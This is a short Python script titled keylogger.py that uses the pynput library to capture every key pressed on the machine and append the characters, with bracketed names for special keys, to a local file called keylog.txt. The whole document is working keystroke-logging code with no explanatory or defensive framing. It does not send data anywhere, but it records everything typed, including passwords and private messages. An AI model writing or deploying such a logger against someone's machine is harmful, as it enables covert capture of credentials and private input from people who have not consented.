# keylogger.py

from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}") 
    except AttributeError:
        # Handle special keys (e.g., space, enter, shift)
        with open(log_file, "a") as f:
            f.write(f"[{key.name}]")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
